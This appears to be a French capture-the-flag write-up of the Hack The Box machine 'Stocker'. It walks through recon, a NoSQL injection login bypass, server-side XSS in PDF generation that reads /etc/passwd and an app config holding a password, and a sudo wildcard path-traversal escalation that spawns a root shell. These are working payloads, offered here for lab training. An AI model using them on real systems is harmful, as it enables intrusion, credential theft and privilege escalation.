# Stocker - Easy

```bash
nmap -sV -sC 10.10.11.196
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-02 21:24 EST
Nmap scan report for 10.10.11.196
Host is up (0.026s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On tombe sur un site au domaine stocker.htb. On lance un gobuster en fond.

Le serveur est un nginx et il y a du C sur le site.

Rien de spécial lors du gobuster donc on cherche un subdomain

```bash
gobuster vhost -u http://stocker.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

Found: dev.stocker.htb (Status: 302) [Size: 28]
```

On tombe sur une page de login alors on relance un gobuster dir. On sait qu’il y a du express et du node.js. Pas de nouveau directory ou fichier trouvé.

```bash
sqlmap -r login.req --level 5 --risk 3
```

La tentative de SQLmap échoue, il n’y a pas d’injection SQL. En plus de cela il semble qu’il y aie un WAF bloquant le spam. On a pas d’autres pistes alors on va tenter le NoSQL. Pour tester les injections on utilise burpsuite.

L’astuce est donc de changer le Content-type en application/json et de rentrer le payload suivant

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

ne signifie not equal et la faille ici est qu’on peut interpréter ces opérations dans la requête.

On tombe alors sur la page stock et lorsque l’on regarde le code source on peut voir une grande fonction qui contient un appel d’api

```jsx
submitPurchase.addEventListener("click", () => {
      fetch("/api/order", {
        method: "POST",
        body: JSON.stringify({ basket }),
        headers: {
          "Content-Type": "application/json",
        },
      })
        .then((response) => response.json())
        .then((response) => {
          if (!response.success) return alert("Something went wrong processing your order!");

          purchaseOrderLink.setAttribute("href", `/api/po/${response.orderId}`);

          $("#order-id").textContent = response.orderId;

          beforePurchase.style.display = "none";
          afterPurchase.style.display = "";
          submitPurchase.style.display = "none";
        });
    });
```

Interceptons la dernière requête pour voir:

```json
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

Vu que c’est une génération dynamique de PDF: cf [https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)

On peut insérer du code javascript qui va être interprété lors de la génération du pdf. Par exemple on peut saisir ça dans le champ title: 

```jsx
<script>document.write(JSON.stringify(window.location))</script>
```

Le but est donc de récupérer des infos utiles pour le foothold. On sait déjà qu’on est dans le dossier /var/www/dev/

Voici un iframe pour lire etc/passwd mais il faut adapter les dimensions pour lire

```jsx
<iframe src=file:///etc/passwd width=1000 height=1000></iframe>
```

Les deux seuls users à avoir /bin/bash sont root et: 

```bash
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
```

Ce sont donc les seuls deux users. On va maintenant chercher dans les fichiers du site si on ne peut pas trouver un fichier de config contenant un mdp.

```jsx
<iframe src=file:///var/www/dev/index.js width=1000 height=1000></iframe>
```

On trouve donc le mdp de connexion de mongoDB dans ce fichier. En tentant avec SSH c’est aussi le mdp de angoose, on a le flag user.

Réflexe:

```bash
sudo -l
User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

Problème, voici nos droits:

```bash
64592 drwxr-xr-x  3 root root 4096 Dec  6 10:33 .
```

On ne peut pas rajouter de script alors il faut essayer de voir les scripts qui sont déjà dedans.

On peut voir cette ligne à l’execution de certains scripts:

```bash
Connecting to mongodb://<credentials>@localhost/prod?authSource=admin&w=1
```

Après réflexion le “*” nous permet d’exectuer n’importe quel .js de la sorte:

```bash
sudo /usr/bin/node /usr/local/scripts/../../../tmp/shell.js
```

On rentre donc ce code dans notre shell:

```jsx
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
```

On obtient un shell root et le flag !